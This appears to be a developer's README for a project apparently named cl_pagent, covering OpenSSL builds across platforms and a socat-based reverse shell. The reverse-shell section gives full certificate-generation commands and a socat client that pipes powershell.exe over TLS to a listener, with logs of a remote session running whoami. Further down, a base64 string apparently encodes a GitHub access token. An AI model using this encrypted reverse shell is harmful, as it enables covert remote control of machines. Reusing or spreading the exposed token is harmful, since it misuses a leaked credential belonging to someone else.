# part3rd uses
## openssl
问题：在不同平台上使用不同的目录，尽量不要使用系统自动安装的静态库(libcrypto.a+libssl.a)

- Windows平台：
- - windows10系统及以上
- - 使用 mingw编译的 `part3rd>openssl-1.1.1d-win64-mingw` 
- - set On CMakeLists.txt: `set(OPENSSL_ROOT_DIR ${CMAKE_CURRENT_SOURCE_DIR}/part3rd/openssl-1.1.1w-linux-gcc)`
- Linux平台：
- - Kali2022`Linux kali 5.18.0-kali5-amd64 Debian 5.18.5-1kali6 (2022-07-07) x86_64 GNU/Linux`及以上（ubuntu20是不行的！glibc有bug，静态编译后运行会崩溃 segment fault）
- - 支持的 不存在bug的 glibc信息：
@import "images/1.png"
- - 工程中的`part3rd>openssl-1.1.1w-linux-gcc`也是在kali下编译安装的！因此最好在kali中使用开发！
- MacM1 Darwin平台：
- - m1平台及以上 darwin aarch64(arm64)
- - 如果使用brew安装的openssl，就不能静态编译了，编译会提示缺少-lcrto.0;只能动态链接使用！！

## drogon - trantor - openssl 


## socat - openssl - reverseShell
注意：
- socat for windows 只能在cygwin平台gcc+make编译

具体工程见：cyg_pagent（不在该项目中！）

### Configuring OpenSSL in socat
 only use self signed certificates for the sake of simplicity.
 We assume that the server host is called `win10d`(hostname) and the server process uses port 4433. To keep it simple, we use a very simple server functionality that just echos data (echo), and stdio on the client.

create server & client pem&crt certificate files

N.B. common_name: win10d
- Generate a server certificate: (On cygwin's Cygwin.bat)
```bash
cd socat-1.8.0.3
mkdir server 
cd server
# Prepare a basename for the files related to the server certificate:
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 2048
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
# You will be prompted for your country code, name etc.; you may quit all prompts with the ENTER key, except for the Common Name which must be exactly the name or IP address of the server that the client will use.
# mainly: common_name: win10d
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
# The files that contain the private key should be kept secret, thus adapt their permissions:
chmod 600 $FILENAME.key $FILENAME.pem
```

- Generate a client certificate: 
```bash
mkdir client 
cd client
FILENAME=client
openssl genrsa -out $FILENAME.key 2048
# CommonName not need to input!!
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

### OpenSSL Server
Instead of using a tcp-listen (tcp-l) address, we use openssl-listen (ssl-l) for the server, cert=... tells the program to the file containing its certificate and private key, and cafile=... points to the file containing the certificate of the peer

run can on Cmd
```bash
C:\wd\socat-1.8.0.3>socat.exe -d -d OPENSSL-LISTEN:4433,reuseaddr,cert=./server/server.pem,cafile=./client/client.crt STDOUT
```

### OpenSSL Client
run can on Cmd
```bash
C:\wd\socat-1.8.0.3>socat.exe OPENSSL-CONNECT:win10d:4433,cert=./client/client.pem,cafile=./server/server.crt EXEC:'powershell.exe',pipes
```

### result
server-side(listen):
```bash
C:\wd\socat-1.8.0.3>socat.exe -d -d OPENSSL-LISTEN:4433,reuseaddr,cert=./server/server.pem,cafile=./client/client.crt STDOUT
2025/03/10 03:50:21 socat[1005] W OpenSSL: Warning: this implementation does not check CRLs
2025/03/10 03:50:21 socat[1005] N listening on AF=2 0.0.0.0:4433
2025/03/10 03:50:37 socat[1005] N accepting connection from AF=2 172.110.21.128:61795 on AF=2 172.110.21.128:4433
2025/03/10 03:50:37 socat[1005] N trusting certificate, no check of commonName
2025/03/10 03:50:37 socat[1005] N SSL proto version used: TLSv1.3
2025/03/10 03:50:37 socat[1005] N SSL connection using TLS_AES_256_GCM_SHA384
2025/03/10 03:50:37 socat[1005] N SSL connection compression "none"
2025/03/10 03:50:37 socat[1005] N SSL connection expansion "none"
2025/03/10 03:50:37 socat[1005] W address is opened in read-write mode but only supports write-only
2025/03/10 03:50:37 socat[1005] N using stdout for reading and writing
2025/03/10 03:50:37 socat[1005] N starting data transfer loop with FDs [8,8] and [1,1]
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\wd\socat-1.8.0.3> whoami
whoami
win10d\vboxuser
PS C:\wd\socat-1.8.0.3> pwd
pwd

Path
----
C:\wd\socat-1.8.0.3
```

client-side:
```bash
C:\wd\socat-1.8.0.3>socat.exe OPENSSL-CONNECT:win10d:4433,cert=./client/client.pem,cafile=./server/server.crt EXEC:'powershell.exe',pipes
2025/03/10 03:50:37 socat[1006] W OpenSSL: Warning: this implementation does not check CRLs
```

# github  store
base64 decode (https://www.toolhelper.cn/EncodeDecode/Base64) 
Z2hwX1JLa0FMSGNrSTM4eW5LWHFreWM3R2o2RGFkNGRhODBPNHI1Zw==

第一次操作：
```bash
git init -b main  # 明确分支名字为main
git add .  # 添加所有子目录和文件
git commit -m "First Commit"  # 添加到本地git仓库
# 设置远程url
git remote -v  # 首先查看该目录内是否有remote url，没有就add ；否则就set-url来替换更改已有的
# origin是名字
git remote add origin https://xxx@github.com/embarassed01/cl_pagent.git

git push -u origin main
```
